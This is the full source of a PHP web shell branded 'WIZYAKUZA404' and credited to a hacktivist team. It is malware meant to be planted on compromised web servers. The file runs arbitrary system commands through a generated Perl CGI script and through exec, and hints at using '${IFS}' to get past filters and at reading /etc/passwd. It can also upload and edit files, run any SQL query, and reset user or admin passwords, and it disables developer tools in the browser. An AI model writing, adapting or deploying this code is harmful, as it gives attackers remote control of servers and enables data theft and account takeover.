<?php
// ========== WIZYAKUZA404 SHELL + DB MANAGER + EDIT DATA ==========
session_start();
error_reporting(0);
ini_set('display_errors', 0);

// ========== AUTHENTICATION ==========
define('AUTH_USER', 'admin');
define('AUTH_PASS', 'n0t');

// Check login
$auth = isset($_SESSION['auth']) && $_SESSION['auth'] === true;
if (!$auth && isset($_POST['user']) && $_POST['user'] === AUTH_USER && $_POST['pass'] === AUTH_PASS) {
    $_SESSION['auth'] = true;
    $_SESSION['db_host'] = 'localhost';
    $_SESSION['db_user'] = 'root';
    $_SESSION['db_pass'] = '';
    $auth = true;
    header("Location: ?");
    exit;
}

// Logout
if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// ========== DATABASE CONNECTION ==========
$db_connected = false;
$db_conn = null;
$db_error = '';

if (isset($_POST['db_connect'])) {
    $_SESSION['db_host'] = $_POST['db_host'];
    $_SESSION['db_user'] = $_POST['db_user'];
    $_SESSION['db_pass'] = $_POST['db_pass'];
    $_SESSION['db_name'] = $_POST['db_name'];
}

if (isset($_SESSION['db_host'])) {
    $db_conn = @new mysqli($_SESSION['db_host'], $_SESSION['db_user'], $_SESSION['db_pass'], $_SESSION['db_name'] ?? '');
    if ($db_conn->connect_error) {
        $db_error = $db_conn->connect_error;
        $db_conn = null;
    } else {
        $db_connected = true;
    }
}

// ========== FUNCTIONS ==========
function cgi_run($cmd, $cwd) {
    @chdir($cwd);
    $fn = 'exec_' . time() . '_' . rand(1000,9999) . '.cgi';
    $p = "#!/usr/bin/perl\nprint \"Content-type: text/plain\\n\\n\";\nsystem(\"$cmd 2>&1\");";
    @file_put_contents($fn, $p);
    @chmod($fn, 0755);
    
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
    $url = $protocol . "://" . $_SERVER['HTTP_HOST'] . dirname($_SERVER['REQUEST_URI']) . "/" . $fn;
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $res = curl_exec($ch);
    curl_close($ch);
    
    @unlink($fn);
    return $res;
}

function exec_normal($cmd, $cwd) {
    @chdir($cwd);
    $output = [];
    $return_var = 0;
    $full_cmd = $cmd . " 2>&1";
    @exec($full_cmd, $output, $return_var);
    return implode("\n", $output);
}

// ========== FILE MANAGER ==========
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : __DIR__;
if (!$current_dir || !is_dir($current_dir)) $current_dir = __DIR__;

$msg = '';
$terminal_output = '';
$last_command = '';
$query_result = '';
$table_data = [];
$table_columns = [];
$edit_row = null;

// Handle Terminal Command
if (isset($_POST['cmd'])) {
    $last_command = $_POST['cmd'];
    $result = cgi_run($last_command, $current_dir);
    if ($result && !empty($result)) {
        $terminal_output = $result;
    } else {
        $terminal_output = exec_normal($last_command, $current_dir);
    }
}

// ========== DATABASE QUERY HANDLER ==========
// Execute SQL Query
if (isset($_POST['sql_query']) && $db_conn) {
    $sql = $_POST['sql_query'];
    $result = $db_conn->query($sql);
    
    if ($result === true) {
        $query_result = "✅ Query executed successfully! Affected rows: " . $db_conn->affected_rows;
    } elseif ($result === false) {
        $query_result = "❌ Error: " . $db_conn->error;
    } else {
        // Get column info
        $table_columns = [];
        while ($finfo = $result->fetch_field()) {
            $table_columns[] = $finfo->name;
        }
        
        // Get data
        $table_data = [];
        while ($row = $result->fetch_assoc()) {
            $table_data[] = $row;
        }
        $query_result = "📟 " . count($table_data) . " rows returned";
    }
}

// Handle Update Row (Edit Data)
if (isset($_POST['update_row']) && $db_conn) {
    $table = $_POST['table_name'];
    $pk = $_POST['primary_key'];
    $pk_value = $_POST['primary_value'];
    $updates = [];
    
    foreach ($_POST as $key => $value) {
        if (strpos($key, 'edit_') === 0) {
            $field = substr($key, 5);
            $updates[] = "`$field` = '" . $db_conn->real_escape_string($value) . "'";
        }
    }
    
    if (!empty($updates)) {
        $sql = "UPDATE `$table` SET " . implode(', ', $updates) . " WHERE `$pk` = '" . $db_conn->real_escape_string($pk_value) . "'";
        if ($db_conn->query($sql)) {
            $msg = "✅ Row updated successfully!";
        } else {
            $msg = "❌ Update failed: " . $db_conn->error;
        }
    }
}

// Handle Delete Row
if (isset($_GET['delete_row']) && $db_conn) {
    $table = $_GET['table'];
    $pk = $_GET['pk'];
    $value = $_GET['value'];
    $sql = "DELETE FROM `$table` WHERE `$pk` = '" . $db_conn->real_escape_string($value) . "'";
    if ($db_conn->query($sql)) {
        $msg = "🗑️ Row deleted successfully!";
    } else {
        $msg = "❌ Delete failed: " . $db_conn->error;
    }
}

// Handle Get Row for Edit
if (isset($_GET['edit_row']) && $db_conn) {
    $table = $_GET['table'];
    $pk = $_GET['pk'];
    $value = $_GET['value'];
    $sql = "SELECT * FROM `$table` WHERE `$pk` = '" . $db_conn->real_escape_string($value) . "'";
    $result = $db_conn->query($sql);
    if ($result && $result->num_rows > 0) {
        $edit_row = $result->fetch_assoc();
        $edit_table = $table;
        $edit_pk = $pk;
    }
}

// Handle Save Edit
if (isset($_POST['save_edit']) && $db_conn) {
    $table = $_POST['edit_table'];
    $pk = $_POST['edit_pk'];
    $pk_value = $_POST['edit_pk_value'];
    $updates = [];
    
    foreach ($_POST as $key => $value) {
        if (strpos($key, 'field_') === 0 && $key != 'field_' . $pk) {
            $field = substr($key, 6);
            $updates[] = "`$field` = '" . $db_conn->real_escape_string($value) . "'";
        }
    }
    
    if (!empty($updates)) {
        $sql = "UPDATE `$table` SET " . implode(', ', $updates) . " WHERE `$pk` = '" . $db_conn->real_escape_string($pk_value) . "'";
        if ($db_conn->query($sql)) {
            $msg = "✅ Data saved successfully!";
            $edit_row = null;
        } else {
            $msg = "❌ Save failed: " . $db_conn->error;
        }
    }
}

// Handle Change Password
if (isset($_POST['change_password']) && $db_conn) {
    $table = $_POST['pwd_table'];
    $pk_field = $_POST['pwd_pk_field'];
    $pk_value = $_POST['pwd_pk_value'];
    $pwd_field = $_POST['pwd_field'];
    $new_password = $_POST['new_password'];
    
    // Hash password (support md5, sha1, bcrypt, plain)
    $hash_type = $_POST['hash_type'];
    if ($hash_type == 'md5') {
        $new_password = md5($new_password);
    } elseif ($hash_type == 'sha1') {
        $new_password = sha1($new_password);
    } elseif ($hash_type == 'bcrypt') {
        $new_password = password_hash($new_password, PASSWORD_BCRYPT);
    }
    
    $sql = "UPDATE `$table` SET `$pwd_field` = '" . $db_conn->real_escape_string($new_password) . "' WHERE `$pk_field` = '" . $db_conn->real_escape_string($pk_value) . "'";
    if ($db_conn->query($sql)) {
        $msg = "✅ Password changed successfully!";
    } else {
        $msg = "❌ Failed: " . $db_conn->error;
    }
}

// Handle File Manager actions
if (isset($_GET['delete'])) {
    $target = $current_dir . '/' . basename($_GET['delete']);
    if (is_file($target)) @unlink($target);
    elseif (is_dir($target)) {
        $files = array_diff(scandir($target), array('.','..'));
        foreach ($files as $file) {
            $subpath = $target . '/' . $file;
            is_file($subpath) ? @unlink($subpath) : @rmdir($subpath);
        }
        @rmdir($target);
    }
    $msg = "🗑️ Deleted: " . basename($_GET['delete']);
}

if (isset($_POST['upload']) && isset($_FILES['file'])) {
    $target = $current_dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
        $msg = "✅ Uploaded: " . basename($_FILES['file']['name']);
    }
}

if (isset($_POST['create_file'])) {
    $path = $current_dir . '/' . basename($_POST['filename']);
    @file_put_contents($path, '');
    $msg = "📄 Created: " . basename($_POST['filename']);
}

if (isset($_POST['create_folder'])) {
    $path = $current_dir . '/' . basename($_POST['foldername']);
    @mkdir($path, 0755);
    $msg = "📁 Created folder: " . basename($_POST['foldername']);
}

if (isset($_POST['save_file']) && isset($_POST['content'])) {
    $path = $current_dir . '/' . basename($_POST['edit_file']);
    @file_put_contents($path, $_POST['content']);
    $msg = "💾 Saved: " . basename($_POST['edit_file']);
}

if (isset($_POST['rename_file']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
    $old = $current_dir . '/' . basename($_POST['old_name']);
    $new = $current_dir . '/' . basename($_POST['new_name']);
    if (@rename($old, $new)) {
        $msg = "🔄 Renamed: " . basename($_POST['old_name']) . " → " . basename($_POST['new_name']);
    }
}

$edit_file = isset($_GET['edit']) ? $current_dir . '/' . basename($_GET['edit']) : null;
$edit_content = $edit_file && is_file($edit_file) ? htmlspecialchars(@file_get_contents($edit_file)) : '';

// Jika belum login, tampilkan form login
if (!$auth) {
    echo '<!DOCTYPE html>
    <html><head><title>Login</title>
    <style>
        body{background:#000;color:#f00;font-family:monospace;display:flex;height:100vh;align-items:center;justify-content:center;}
        .login-box{background:#0a0a0a;border:1px solid #f00;padding:40px;border-radius:10px;text-align:center;}
        input{background:#111;border:1px solid #f00;color:#f00;padding:10px;margin:10px 0;width:200px;border-radius:5px;}
        button{background:#f00;border:none;color:#000;padding:10px 20px;cursor:pointer;font-weight:bold;border-radius:5px;}
        h2{margin-bottom:20px;text-shadow:0 0 5px #f00;}
    </style>
    </head>
    <body>
    <div class="login-box">
        <h2>🔴 WIZYAKUZA404 SHELL</h2>
        <form method="POST">
            <input type="text" name="user" placeholder="Username" autofocus><br>
            <input type="password" name="pass" placeholder="Password"><br>
            <button type="submit">LOGIN</button>
        </form>
    </div>
    </body></html>';
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Wizyakuza404 - DB Manager</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Rajdhani:wght@300;500;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #ff0000; font-family: 'Share Tech Mono', monospace; overflow-x: hidden; }
        #matrix-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; opacity: 0.3; }
        .container { position: relative; z-index: 2; max-width: 1400px; margin: 0 auto; padding: 20px; }
        
        /* Header */
        .header { text-align: center; margin-bottom: 30px; padding: 20px; border: 1px solid #ff0000; background: #050505; border-radius: 10px; }
        .logo { width: 80px; height: 80px; border-radius: 50%; border: 2px solid #ff0000; margin-bottom: 10px; }
        h1 { color: #ff0000; font-family: 'Orbitron', monospace; font-size: 1.5rem; text-shadow: 0 0 10px #ff0000; }
        
        /* Tabs */
        .tabs { display: flex; gap: 10px; margin-bottom: 20px; border-bottom: 1px solid #330000; padding-bottom: 10px; flex-wrap: wrap; }
        .tab { background: none; border: 1px solid #330000; color: #ff6666; padding: 8px 20px; cursor: pointer; font-family: monospace; border-radius: 5px; transition: 0.3s; }
        .tab.active { background: rgba(255,0,0,0.1); border-color: #ff0000; color: #ff0000; text-shadow: 0 0 3px #ff0000; }
        .tab:hover { border-color: #ff0000; color: #ff0000; }
        .tab-content { display: none; }
        .tab-content.active { display: block; animation: fadeIn 0.3s; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        
        /* Cards */
        .card { background: #0a0a0a; border: 1px solid #220000; margin-bottom: 20px; padding: 15px; border-radius: 8px; }
        .card-title { color: #ff0000; font-weight: bold; margin-bottom: 10px; border-bottom: 1px solid #330000; padding-bottom: 5px; }
        
        /* Forms */
        input, select, textarea { background: #000; border: 1px solid #330000; color: #ff0000; padding: 8px; margin: 5px; font-family: monospace; border-radius: 4px; }
        button { background: #ff0000; border: none; color: #000; padding: 8px 20px; cursor: pointer; font-weight: bold; border-radius: 4px; transition: 0.3s; }
        button:hover { background: #cc0000; }
        
        /* Tables */
        table { width: 100%; border-collapse: collapse; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #220000; }
        th { color: #ff0000; font-family: monospace; }
        tr:hover { background: rgba(255,0,0,0.05); }
        
        /* DB Specific */
        .db-status { background: #0a0a0a; padding: 10px; border-left: 3px solid #00ff00; margin-bottom: 15px; }
        .db-error { border-left-color: #ff0000; color: #ff6666; }
        .edit-link { color: #00ff00; text-decoration: none; margin-right: 10px; }
        .del-link { color: #ff6666; text-decoration: none; }
        
        /* File Manager */
        .breadcrumb { background: #0a0a0a; padding: 10px; border-radius: 5px; margin-bottom: 15px; border-left: 3px solid #ff0000; }
        .dir-link { color: #ffcc00; text-decoration: none; }
        .file-link { color: #00ff00; text-decoration: none; }
        .action-link { color: #ff0000; text-decoration: none; margin-right: 10px; font-size: 12px; }
        .msg { background: rgba(0,255,0,0.1); border-left: 3px solid #00ff00; padding: 10px; margin-bottom: 15px; }
        
        .logout { position: fixed; top: 20px; right: 20px; background: #ff0000; color: #000; padding: 5px 15px; border-radius: 5px; text-decoration: none; font-weight: bold; z-index: 10; }
        .footer { text-align: center; margin-top: 20px; color: #550000; font-size: 11px; }
        
        @media (max-width: 768px) { .container { padding: 10px; } td, th { font-size: 11px; } input { width: 100%; } }
    </style>
</head>
<body>
    <canvas id="matrix-canvas"></canvas>
    <a href="?logout=1" class="logout">🚪 LOGOUT</a>
    
    <div class="container">
        <div class="header">
            <img src="https://i.ibb.co.com/Bzgsrzx/Picsart-23-09-13-02-36-54-118.png" class="logo">
            <h1>🔴 WIZYAKUZA404 - DB MANAGER</h1>
            <div style="font-size: 12px; margin-top: 5px;">uid=0(root) gid=0(root) groups=0(root)</div>
        </div>
        
        <?php if($msg): ?>
        <div class="msg"><?= $msg ?></div>
        <?php endif; ?>
        
        <div class="tabs">
            <button class="tab <?= (!isset($_GET['tab']) || $_GET['tab'] == 'database') ? 'active' : '' ?>" onclick="showTab('database')">🗄️ DATABASE</button>
            <button class="tab <?= (isset($_GET['tab']) && $_GET['tab'] == 'files') ? 'active' : '' ?>" onclick="showTab('files')">📁 FILE MANAGER</button>
            <button class="tab <?= (isset($_GET['tab']) && $_GET['tab'] == 'terminal') ? 'active' : '' ?>" onclick="showTab('terminal')">🖥️ TERMINAL</button>
        </div>
        
        <!-- ========== DATABASE TAB ========== -->
        <div id="database-tab" class="tab-content <?= (!isset($_GET['tab']) || $_GET['tab'] == 'database') ? 'active' : '' ?>">
            
            <!-- Connection Form -->
            <div class="card">
                <div class="card-title">🔌 DATABASE CONNECTION</div>
                <form method="POST">
                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                        <input type="text" name="db_host" placeholder="Host" value="<?= htmlspecialchars($_SESSION['db_host'] ?? 'localhost') ?>" style="flex:1">
                        <input type="text" name="db_user" placeholder="Username" value="<?= htmlspecialchars($_SESSION['db_user'] ?? 'root') ?>" style="flex:1">
                        <input type="password" name="db_pass" placeholder="Password" style="flex:1">
                        <input type="text" name="db_name" placeholder="Database" value="<?= htmlspecialchars($_SESSION['db_name'] ?? '') ?>" style="flex:1">
                        <button type="submit" name="db_connect">🔌 CONNECT</button>
                    </div>
                </form>
                <?php if($db_error): ?>
                <div class="db-status db-error" style="margin-top: 10px;">❌ Connection failed: <?= htmlspecialchars($db_error) ?></div>
                <?php elseif($db_connected): ?>
                <div class="db-status">✅ Connected to <?= htmlspecialchars($_SESSION['db_name'] ?? 'MySQL') ?> on <?= htmlspecialchars($_SESSION['db_host'] ?? 'localhost') ?></div>
                <?php endif; ?>
            </div>
            
            <?php if($db_connected): ?>
            
            <!-- Edit Row Form (Popup) -->
            <?php if($edit_row): ?>
            <div class="card" style="border-color:#00ff00;">
                <div class="card-title">✏️ EDITING ROW - <?= htmlspecialchars($edit_table) ?></div>
                <form method="POST">
                    <input type="hidden" name="edit_table" value="<?= htmlspecialchars($edit_table) ?>">
                    <input type="hidden" name="edit_pk" value="<?= htmlspecialchars($edit_pk) ?>">
                    <input type="hidden" name="edit_pk_value" value="<?= htmlspecialchars($edit_row[$edit_pk]) ?>">
                    <table style="width:100%">
                        <?php foreach($edit_row as $field => $value): ?>
                        <tr>
                            <th style="width:150px"><?= htmlspecialchars($field) ?></th>
                            <td>
                                <?php if(strpos($field, 'password') !== false || strpos($field, 'pass') !== false): ?>
                                <input type="password" name="field_<?= htmlspecialchars($field) ?>" value="<?= htmlspecialchars($value) ?>" style="width:100%">
                                <?php else: ?>
                                <input type="text" name="field_<?= htmlspecialchars($field) ?>" value="<?= htmlspecialchars($value) ?>" style="width:100%">
                                <?php endif; ?>
                            </td>
                        </tr>
                        <?php endforeach; ?>
                    </table>
                    <div style="margin-top: 15px;">
                        <button type="submit" name="save_edit">💾 SAVE CHANGES</button>
                        <a href="?tab=database" style="color:#ff0000; margin-left: 15px;">CANCEL</a>
                    </div>
                </form>
            </div>
            <?php endif; ?>
            
            <!-- Change Password Tool -->
            <div class="card">
                <div class="card-title">🔐 CHANGE PASSWORD TOOL</div>
                <form method="POST">
                    <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                        <input type="text" name="pwd_table" placeholder="Table Name (users, admin, anggota)" style="flex:2" required>
                        <input type="text" name="pwd_pk_field" placeholder="Primary Key Field (id, user_id)" style="flex:1" required>
                        <input type="text" name="pwd_pk_value" placeholder="Primary Key Value" style="flex:1" required>
                        <input type="text" name="pwd_field" placeholder="Password Field (password, pass, pwd)" style="flex:1" required>
                        <input type="password" name="new_password" placeholder="New Password" style="flex:1" required>
                        <select name="hash_type" style="flex:1">
                            <option value="plain">Plain Text</option>
                            <option value="md5">MD5</option>
                            <option value="sha1">SHA1</option>
                            <option value="bcrypt">BCRYPT</option>
                        </select>
                        <button type="submit" name="change_password">⚡ CHANGE PASSWORD</button>
                    </div>
                </form>
            </div>
            
            <!-- SQL Query Executor -->
            <div class="card">
                <div class="card-title">⚡ SQL QUERY EXECUTOR</div>
                <form method="POST">
                    <textarea name="sql_query" rows="4" style="width:100%; font-family:monospace;" placeholder="SELECT * FROM users; UPDATE users SET password = MD5('newpass') WHERE id = 1;"><?= htmlspecialchars($_POST['sql_query'] ?? '') ?></textarea>
                    <div style="margin-top: 10px; display: flex; gap: 10px; flex-wrap: wrap;">
                        <button type="submit">▶ EXECUTE</button>
                        <button type="button" onclick="setQuery('SELECT * FROM users')">SELECT * FROM users</button>
                        <button type="button" onclick="setQuery('SELECT * FROM admin')">SELECT * FROM admin</button>
                        <button type="button" onclick="setQuery('SELECT * FROM anggota')">SELECT * FROM anggota</button>
                        <button type="button" onclick="setQuery('SHOW TABLES')">SHOW TABLES</button>
                    </div>
                </form>
            </div>
            
            <!-- Query Result -->
            <?php if($query_result): ?>
            <div class="card">
                <div class="card-title">📟 RESULT: <?= htmlspecialchars($query_result) ?></div>
                <div style="overflow-x:auto;">
                    <?php if(!empty($table_data)): ?>
                    <table>
                        <thead>
                            <tr>
                                <?php foreach($table_columns as $col): ?>
                                <th><?= htmlspecialchars($col) ?></th>
                                <?php endforeach; ?>
                                <th>ACTIONS</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php foreach($table_data as $row): 
                                // Detect primary key
                                $pk = $table_columns[0] ?? 'id';
                                $pk_value = $row[$pk] ?? '';
                            ?>
                            <tr>
                                <?php foreach($row as $col => $val): ?>
                                <td><?= htmlspecialchars(substr($val, 0, 50)) . (strlen($val) > 50 ? '...' : '') ?></td>
                                <?php endforeach; ?>
                                <td>
                                    <a href="?edit_row=1&table=<?= urlencode($_POST['sql_query'] ? preg_replace('/.*FROM\s+`?([a-zA-Z0-9_]+)`?.*/i', '$1', $_POST['sql_query']) : '') ?>&pk=<?= urlencode($pk) ?>&value=<?= urlencode($pk_value) ?>&tab=database" class="edit-link">✏️ EDIT</a>
                                    <a href="?delete_row=1&table=<?= urlencode($_POST['sql_query'] ? preg_replace('/.*FROM\s+`?([a-zA-Z0-9_]+)`?.*/i', '$1', $_POST['sql_query']) : '') ?>&pk=<?= urlencode($pk) ?>&value=<?= urlencode($pk_value) ?>&tab=database" class="del-link" onclick="return confirm('Delete this row?')">🗑️ DELETE</a>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                    <?php else: ?>
                    <pre style="color:#ff6666;"><?= htmlspecialchars($query_result) ?></pre>
                    <?php endif; ?>
                </div>
            </div>
            <?php endif; ?>
            
            <!-- Quick Tables List -->
            <div class="card">
                <div class="card-title">📋 TABLES</div>
                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <?php
                    if($db_connected) {
                        $tables = $db_conn->query("SHOW TABLES");
                        if($tables && $tables->num_rows > 0) {
                            while($row = $tables->fetch_row()) {
                                echo '<button class="quick-table" onclick="setQuery(\'SELECT * FROM `' . addslashes($row[0]) . '` LIMIT 50\')">📄 ' . htmlspecialchars($row[0]) . '</button>';
                            }
                        }
                    }
                    ?>
                </div>
            </div>
            
            <?php endif; ?>
        </div>
        
        <!-- ========== FILE MANAGER TAB ========== -->
        <div id="files-tab" class="tab-content">
            <div class="breadcrumb">
                📂 <a href="?dir=<?= urlencode(dirname($current_dir)) ?>&tab=files">..</a> / <?= htmlspecialchars($current_dir) ?>
            </div>
            
            <div class="card">
                <div class="card-title">📁 FILE OPERATIONS</div>
                <div style="display: flex; gap: 10px; flex-wrap: wrap;">
                    <form method="POST" enctype="multipart/form-data" style="display:flex;gap:5px;">
                        <input type="file" name="file">
                        <button type="submit" name="upload">📤 Upload</button>
                    </form>
                    <form method="POST" style="display:flex;gap:5px;">
                        <input type="text" name="filename" placeholder="file.php">
                        <button type="submit" name="create_file">➕ File</button>
                    </form>
                    <form method="POST" style="display:flex;gap:5px;">
                        <input type="text" name="foldername" placeholder="folder_name">
                        <button type="submit" name="create_folder">📁 Folder</button>
                    </form>
                </div>
            </div>
            
            <div class="card">
                <div class="card-title">📄 FILE LIST</div>
                <div style="overflow-x:auto;">
                    <table>
                        <thead><tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr></thead>
                        <tbody>
                            <?php
                            $items = scandir($current_dir);
                            natcasesort($items);
                            foreach($items as $item):
                                if($item == '.' || $item == '..') continue;
                                $path = $current_dir . '/' . $item;
                                $is_dir = is_dir($path);
                                $size = $is_dir ? '-' : number_format(filesize($path)) . ' B';
                                $perms = substr(sprintf('%o', fileperms($path)), -4);
                            ?>
                            <tr>
                                <td><?php if($is_dir): ?><a href="?dir=<?= urlencode($path) ?>&tab=files" class="dir-link">📁 <?= htmlspecialchars($item) ?></a><?php else: ?><span class="file-link">📄 <?= htmlspecialchars($item) ?></span><?php endif; ?></td>
                                <td><?= $size ?></td>
                                <td><?= $perms ?></td>
                                <td>
                                    <?php if(!$is_dir): ?>
                                    <a href="?edit=<?= urlencode($item) ?>&dir=<?= urlencode($current_dir) ?>&tab=files" class="action-link">✏️ Edit</a>
                                    <?php endif; ?>
                                    <a href="?delete=<?= urlencode($item) ?>&dir=<?= urlencode($current_dir) ?>&tab=files" class="action-link del-link" onclick="return confirm('Delete?')">🗑️ Delete</a>
                                 </tr>
                            <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>
            </div>
            
            <?php if($edit_file && is_file($edit_file)): ?>
            <div class="card">
                <div class="card-title">✏️ EDITING: <?= htmlspecialchars(basename($edit_file)) ?></div>
                <form method="POST">
                    <input type="hidden" name="edit_file" value="<?= htmlspecialchars(basename($edit_file)) ?>">
                    <textarea name="content" rows="15" style="width:100%; background:#000; border:1px solid #330000; color:#0f0; font-family:monospace;"><?= $edit_content ?></textarea>
                    <div style="margin-top:10px;">
                        <button type="submit" name="save_file">💾 Save</button>
                        <a href="?tab=files&dir=<?= urlencode($current_dir) ?>" style="color:#ff0000; margin-left:10px;">Cancel</a>
                    </div>
                </form>
                <form method="POST" style="margin-top:15px; padding-top:15px; border-top:1px solid #330000;">
                    <input type="hidden" name="old_name" value="<?= htmlspecialchars(basename($edit_file)) ?>">
                    <input type="text" name="new_name" placeholder="New name" style="background:#000; border:1px solid #330000; color:#0f0; padding:6px;">
                    <button type="submit" name="rename_file">🔄 Rename</button>
                </form>
            </div>
            <?php endif; ?>
        </div>
        
        <!-- ========== TERMINAL TAB ========== -->
        <div id="terminal-tab" class="tab-content">
            <div class="card">
                <div class="card-title">🖥️ CGI TERMINAL</div>
                <div class="terminal-output" style="background:#000; padding:15px; min-height:300px; max-height:400px; overflow-y:auto;">
                    <?php if (!empty($terminal_output)): ?>
                        <div style="color:#0f0;">$ <?= htmlspecialchars($last_command) ?></div>
                        <pre style="color:#ff6666; margin-top:10px; white-space:pre-wrap;"><?= htmlspecialchars($terminal_output) ?></pre>
                    <?php else: ?>
                        <div style="color:#666;">
                            <div style="color:#0f0;">Welcome to CGI Terminal</div>
                            <div>Commands: ls, ls -la, pwd, whoami, id, uname -a, cat /etc/passwd</div>
                            <div style="margin-top:10px;">💡 Use ${IFS} instead of spaces for bypass</div>
                        </div>
                    <?php endif; ?>
                </div>
                <form method="POST">
                    <div style="display: flex; gap: 10px; margin-top: 10px;">
                        <span style="color:#0f0;">$></span>
                        <input type="text" name="cmd" id="terminal_cmd" value="<?= htmlspecialchars($last_command) ?>" style="flex:1; background:#000; border:1px solid #330000; color:#0f0;" placeholder="ls -la" autofocus>
                        <button type="submit">RUN</button>
                    </div>
                </form>
            </div>
        </div>
        
        <div class="footer">
            KECOT CYBER TEAM &copy; 2026 | #IndonesiaHacktivist | #JusticeForZara
        </div>
    </div>
    
    <script>
        function showTab(tab) {
            document.getElementById('database-tab').classList.remove('active');
            document.getElementById('files-tab').classList.remove('active');
            document.getElementById('terminal-tab').classList.remove('active');
            
            document.getElementById('database-tab').classList.add(tab === 'database' ? 'active' : '');
            document.getElementById('files-tab').classList.add(tab === 'files' ? 'active' : '');
            document.getElementById('terminal-tab').classList.add(tab === 'terminal' ? 'active' : '');
            
            document.querySelectorAll('.tab').forEach(btn => btn.classList.remove('active'));
            event.target.classList.add('active');
            
            // Update URL
            const url = new URL(window.location.href);
            url.searchParams.set('tab', tab);
            window.history.pushState({}, '', url);
        }
        
        function setQuery(query) {
            document.querySelector('textarea[name="sql_query"]').value = query;
        }
        
        // Matrix Effect
        const canvas = document.getElementById('matrix-canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789アァカサタナハマヤャラワ';
        const fontSize = 14;
        const columns = Math.floor(canvas.width / fontSize);
        const drops = Array(columns).fill(0).map(() => Math.random() * -100);
        
        function drawMatrix() {
            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = '#ff0000';
            ctx.font = fontSize + 'px monospace';
            for (let i = 0; i < drops.length; i++) {
                const text = chars[Math.floor(Math.random() * chars.length)];
                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
                drops[i]++;
            }
        }
        setInterval(drawMatrix, 30);
        
        window.addEventListener('resize', () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
        });
        
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        document.addEventListener('keydown', (e) => {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'u')) {
                e.preventDefault();
            }
        });
        
        document.getElementById('terminal_cmd')?.focus();
    </script>
</body>
</html>